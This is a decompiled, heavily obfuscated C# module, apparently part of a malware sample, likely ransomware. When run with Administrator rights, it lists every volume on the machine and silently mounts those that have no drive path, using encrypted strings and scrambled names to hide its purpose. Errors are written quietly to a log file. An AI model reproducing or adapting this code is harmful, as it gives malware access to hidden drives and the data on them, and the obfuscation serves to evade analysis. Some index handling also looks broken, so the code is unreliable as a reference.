using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

public static class xHzpPrHTVbq
{
	public enum pgLVZjwalYhHb : uint
	{
		AtbnAUDhqMP,
		DyqbXpyXcJZOcY,
		gXqgUSviTphZI,
		pDRrqKlPWiFydfA,
		wyCZouhyWHFKP,
		lJCflQCBrzr,
		SXfCcBqMmVY
	}

	private sealed class VWJxzezbsrdKRZX
	{
		public uint XJFhLRjIhUouI;

		public uint XiMskwGyhfawjCB;

		public char[] ZvALzwRhNLQx;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			return !GetVolumePathNamesForVolumeNameW(string_0, ZvALzwRhNLQx, XiMskwGyhfawjCB, ref XJFhLRjIhUouI) || ZvALzwRhNLQx.Length != 3;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern pgLVZjwalYhHb GetDriveType([MarshalAs(UnmanagedType.LPStr)] string KglqIdOLOLRQJ);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string fCfOxBqxqSQeS, char[] jjxWWNeWfGhkOZzk, uint ruNQedPxwHXWSV, ref uint lTEmFswCEGVVASA);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> eyxoTbAhVSGy()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void kefPflOplngoCN()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			VWJxzezbsrdKRZX CS_0024_003C_003E8__locals0 = new VWJxzezbsrdKRZX();
			string[] array = new string[26]
			{
				getString_0(107405636),
				getString_0(107405631),
				getString_0(107405594),
				getString_0(107405589),
				getString_0(107405584),
				getString_0(107405611),
				getString_0(107405606),
				getString_0(107405601),
				getString_0(107406076),
				getString_0(107406071),
				getString_0(107406066),
				getString_0(107406093),
				getString_0(107406088),
				getString_0(107406083),
				getString_0(107406046),
				getString_0(107406041),
				getString_0(107406036),
				getString_0(107406031),
				getString_0(107406058),
				getString_0(107406053),
				getString_0(107406048),
				getString_0(107406011),
				getString_0(107406006),
				getString_0(107406001),
				getString_0(107406028),
				getString_0(107406023)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == pgLVZjwalYhHb.DyqbXpyXcJZOcY)
				{
					array2[num++] = text;
				}
			}
			List<string> source = eyxoTbAhVSGy();
			CS_0024_003C_003E8__locals0.XJFhLRjIhUouI = 0u;
			CS_0024_003C_003E8__locals0.XiMskwGyhfawjCB = 120u;
			CS_0024_003C_003E8__locals0.ZvALzwRhNLQx = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.ZvALzwRhNLQx, CS_0024_003C_003E8__locals0.XiMskwGyhfawjCB, ref CS_0024_003C_003E8__locals0.XJFhLRjIhUouI) || CS_0024_003C_003E8__locals0.ZvALzwRhNLQx.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (fQUgTOUpJumL.qqVKUcwYqRObMU)
				{
					try
					{
						Console.WriteLine(getString_0(107406018), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (fQUgTOUpJumL.hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(fQUgTOUpJumL.LImNkSPhwOOQHW, getString_0(107405993) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static xHzpPrHTVbq()
	{
		Strings.CreateGetStringDelegate(typeof(xHzpPrHTVbq));
	}
}
